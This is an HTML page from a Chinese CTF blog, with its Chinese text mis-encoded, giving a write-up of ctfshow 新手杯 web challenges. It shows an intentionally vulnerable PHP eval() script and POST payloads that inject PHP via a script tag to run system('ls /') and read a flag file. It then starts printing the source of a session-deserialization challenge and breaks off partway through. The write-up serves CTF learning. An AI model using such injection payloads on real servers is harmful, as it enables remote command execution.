<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ctfshow-æ–°æ‰‹æ¯-web easy_eval 1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $code = $_POST[&amp;#39;code&amp;#39;]; if(isset($code)){ $code = str_replace(&amp;#34;?&amp;#34;,&amp;#34;&amp;#34;,$code); eval(&amp;#34;?&amp;gt;&amp;#34;.$code); } é¢˜ç›®åˆ†æ 1 2 3 eval(&amp;#34;?&amp;gt;&amp;#34;.$code);å°†å­—ç¬¦ä¸²$codeçš„å†…å®¹ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚ å­—ç¬¦ä¸²&amp;#34;?&amp;gt;&amp;#34;è¡¨ç¤ºPHPçš„ç»“æŸæ ‡è®°ï¼Œè€Œ$codeæ˜¯åŒ…å«è¦æ‰§è¡Œçš„å®é™…PHPä»£ç çš„å­—ç¬¦ä¸²ã€‚ ?&amp;gt;å°†evalå‡½æ•°è¿›è¡Œé—­åˆï¼Œevalå‡½æ•°å¤±å»äº†ä½œç”¨ï¼Œéœ€è¦è‡ªå·±åŠ phpæ ‡ç­¾ï¼Œè¾“å…¥è¿‡æ»¤äº†é—®å·ï¼Œç”¨javascriptçš„æ ‡ç­¾æ¥ä»£æ›¿ã€‚ payload 1 2 3 POST: code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;ls /&amp;#34;); &amp;lt;/script&amp;gt; code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;tac /f1agaaa&amp;#34;); &amp;lt;/script&amp;gt; å‰ªåˆ€çŸ³å¤´å¸ƒ æ‰“å¼€ç¯å¢ƒä¹‹åçš„é¡µé¢
è¾“å…¥nameä»¥åè¿›å…¥çš„é¡µé¢
é¢˜ç›®æºç 
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 &amp;lt;?'>
<title>ctfshow-æ–°æ‰‹æ¯-web</title>

<link rel='canonical' href='https://relish1one.github.io/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/'>

<link rel="stylesheet" href="/scss/style.min.b520104728805017af298ac0ca9dc201454dbb7fb91074b04767eaca6465f278.css"><meta property='og:title' content='ctfshow-æ–°æ‰‹æ¯-web'>
<meta property='og:description' content='ctfshow-æ–°æ‰‹æ¯-web easy_eval 1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $code = $_POST[&amp;#39;code&amp;#39;]; if(isset($code)){ $code = str_replace(&amp;#34;?&amp;#34;,&amp;#34;&amp;#34;,$code); eval(&amp;#34;?&amp;gt;&amp;#34;.$code); } é¢˜ç›®åˆ†æ 1 2 3 eval(&amp;#34;?&amp;gt;&amp;#34;.$code);å°†å­—ç¬¦ä¸²$codeçš„å†…å®¹ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚ å­—ç¬¦ä¸²&amp;#34;?&amp;gt;&amp;#34;è¡¨ç¤ºPHPçš„ç»“æŸæ ‡è®°ï¼Œè€Œ$codeæ˜¯åŒ…å«è¦æ‰§è¡Œçš„å®é™…PHPä»£ç çš„å­—ç¬¦ä¸²ã€‚ ?&amp;gt;å°†evalå‡½æ•°è¿›è¡Œé—­åˆï¼Œevalå‡½æ•°å¤±å»äº†ä½œç”¨ï¼Œéœ€è¦è‡ªå·±åŠ phpæ ‡ç­¾ï¼Œè¾“å…¥è¿‡æ»¤äº†é—®å·ï¼Œç”¨javascriptçš„æ ‡ç­¾æ¥ä»£æ›¿ã€‚ payload 1 2 3 POST: code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;ls /&amp;#34;); &amp;lt;/script&amp;gt; code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;tac /f1agaaa&amp;#34;); &amp;lt;/script&amp;gt; å‰ªåˆ€çŸ³å¤´å¸ƒ æ‰“å¼€ç¯å¢ƒä¹‹åçš„é¡µé¢
è¾“å…¥nameä»¥åè¿›å…¥çš„é¡µé¢
é¢˜ç›®æºç 
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 &amp;lt;?'>
<meta property='og:url' content='https://relish1one.github.io/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/'>
<meta property='og:site_name' content='R1one&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='web' /><meta property='article:tag' content='ctfshow' /><meta property='article:tag' content='æ–°æ‰‹æ¯' /><meta property='article:tag' content='sessionååºåˆ—åŒ–' /><meta property='article:tag' content='å˜é‡è¦†ç›–' /><meta property='article:tag' content='æ•°æ®åˆ†æ' /><meta property='article:published_time' content='2023-05-29T13:27:24&#43;08:00'/><meta property='article:modified_time' content='2023-05-29T13:27:24&#43;08:00'/>
<meta name="twitter:title" content="ctfshow-æ–°æ‰‹æ¯-web">
<meta name="twitter:description" content="ctfshow-æ–°æ‰‹æ¯-web easy_eval 1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $code = $_POST[&amp;#39;code&amp;#39;]; if(isset($code)){ $code = str_replace(&amp;#34;?&amp;#34;,&amp;#34;&amp;#34;,$code); eval(&amp;#34;?&amp;gt;&amp;#34;.$code); } é¢˜ç›®åˆ†æ 1 2 3 eval(&amp;#34;?&amp;gt;&amp;#34;.$code);å°†å­—ç¬¦ä¸²$codeçš„å†…å®¹ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚ å­—ç¬¦ä¸²&amp;#34;?&amp;gt;&amp;#34;è¡¨ç¤ºPHPçš„ç»“æŸæ ‡è®°ï¼Œè€Œ$codeæ˜¯åŒ…å«è¦æ‰§è¡Œçš„å®é™…PHPä»£ç çš„å­—ç¬¦ä¸²ã€‚ ?&amp;gt;å°†evalå‡½æ•°è¿›è¡Œé—­åˆï¼Œevalå‡½æ•°å¤±å»äº†ä½œç”¨ï¼Œéœ€è¦è‡ªå·±åŠ phpæ ‡ç­¾ï¼Œè¾“å…¥è¿‡æ»¤äº†é—®å·ï¼Œç”¨javascriptçš„æ ‡ç­¾æ¥ä»£æ›¿ã€‚ payload 1 2 3 POST: code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;ls /&amp;#34;); &amp;lt;/script&amp;gt; code=&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt; system(&amp;#34;tac /f1agaaa&amp;#34;); &amp;lt;/script&amp;gt; å‰ªåˆ€çŸ³å¤´å¸ƒ æ‰“å¼€ç¯å¢ƒä¹‹åçš„é¡µé¢
è¾“å…¥nameä»¥åè¿›å…¥çš„é¡µé¢
é¢˜ç›®æºç 
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 &amp;lt;?">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/ava_hu23b1ce8b171806f482798fb1ab4dbf94_485038_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">R1one&#39;s Blog</a></h1>
            <h2 class="site-description">ä¿æŒçƒ­çˆ±ï¼Œäº«å—å­¤ç‹¬</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/Relish1one'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="https://relish1one.github.io/" selected>English</option>
                        
                            <option value="https://relish1one.github.io/zh-cn/" >ä¸­æ–‡</option>
                        
                    </select>
                </li>
            
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#easy_eval">easy_eval</a>
      <ol>
        <li>
          <ol>
            <li><a href="#é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#payload">payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#å‰ªåˆ€çŸ³å¤´å¸ƒ">å‰ªåˆ€çŸ³å¤´å¸ƒ</a>
      <ol>
        <li>
          <ol>
            <li><a href="#é¢˜ç›®åˆ†æ-1">é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#payload-1">payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#baby_pickle">baby_pickle</a>
      <ol>
        <li>
          <ol>
            <li><a href="#é¢˜ç›®åˆ†æ-2">é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#çŸ¥è¯†ç‚¹-1">çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#payload-2">payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#repairman">repairman</a>
      <ol>
        <li>
          <ol>
            <li><a href="#é¢˜ç›®åˆ†æ-3">é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#çŸ¥è¯†ç‚¹-2">çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#payload-3">payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#ç®€å•çš„æ•°æ®åˆ†æ">ç®€å•çš„æ•°æ®åˆ†æ</a>
      <ol>
        <li>
          <ol>
            <li><a href="#é¢˜ç›®åˆ†æ-4">é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#payload-4">payload</a></li>
            <li><a href="#å®˜æ–¹payload">å®˜æ–¹payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctfshow/" >
                ctfshow
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/">ctfshow-æ–°æ‰‹æ¯-web</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">May 29, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    17 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="ctfshow-æ–°æ‰‹æ¯-web">ctfshow-æ–°æ‰‹æ¯-web</h1>
<h2 id="easy_eval">easy_eval</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$code</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">$code</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;?&gt;&#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(&#34;?&gt;&#34;.$code);å°†å­—ç¬¦ä¸²$codeçš„å†…å®¹ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚
</span></span><span class="line"><span class="cl">å­—ç¬¦ä¸²&#34;?&gt;&#34;è¡¨ç¤ºPHPçš„ç»“æŸæ ‡è®°ï¼Œè€Œ$codeæ˜¯åŒ…å«è¦æ‰§è¡Œçš„å®é™…PHPä»£ç çš„å­—ç¬¦ä¸²ã€‚
</span></span><span class="line"><span class="cl">?&gt;å°†evalå‡½æ•°è¿›è¡Œé—­åˆï¼Œevalå‡½æ•°å¤±å»äº†ä½œç”¨ï¼Œéœ€è¦è‡ªå·±åŠ phpæ ‡ç­¾ï¼Œè¾“å…¥è¿‡æ»¤äº†é—®å·ï¼Œç”¨javascriptçš„æ ‡ç­¾æ¥ä»£æ›¿ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="payload">payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST:
</span></span><span class="line"><span class="cl">code=&lt;script language=&#34;php&#34;&gt; system(&#34;ls /&#34;); &lt;/script&gt;
</span></span><span class="line"><span class="cl">code=&lt;script language=&#34;php&#34;&gt; system(&#34;tac /f1agaaa&#34;); &lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å‰ªåˆ€çŸ³å¤´å¸ƒ">å‰ªåˆ€çŸ³å¤´å¸ƒ</h2>
<p><strong>æ‰“å¼€ç¯å¢ƒä¹‹åçš„é¡µé¢</strong></p>
<p><img src="/images/%e5%89%aa%e5%88%80%e7%9f%b3%e5%a4%b4%e5%b8%83-1.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><strong>è¾“å…¥nameä»¥åè¿›å…¥çš„é¡µé¢</strong></p>
<p><img src="/images/%e5%89%aa%e5%88%80%e7%9f%b3%e5%a4%b4%e5%b8%83-2.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><strong>é¢˜ç›®æºç </strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">phpinfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$log</span><span class="p">,</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$play</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span> <span class="o">=</span> <span class="s1">&#39;/tmp/&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.log&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">play</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">,</span><span class="nv">$bot_input</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Rock&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&amp;#9996;&amp;#127995;&#39;</span><span class="p">,</span><span class="s1">&#39;Paper&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&amp;#9994;&amp;#127995;&#39;</span><span class="p">,</span><span class="s1">&#39;Scissors&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&amp;#9995;&amp;#127995;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">=</span> <span class="nv">$user_input</span><span class="o">.</span><span class="nv">$bot_input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;RockRock&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;PaperPaper&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;ScissorsScissors&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">,</span><span class="s2">&#34;&lt;div&gt;&#34;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$user_input</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; VS &#39;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$bot_input</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; Draw&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nx">FILE_APPEND</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Draw&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;RockPaper&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;PaperScissors&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;ScissorsRock&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">,</span><span class="s2">&#34;&lt;div&gt;&#34;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$user_input</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; VS &#39;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$bot_input</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; You Lose&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nx">FILE_APPEND</span><span class="p">);</span>
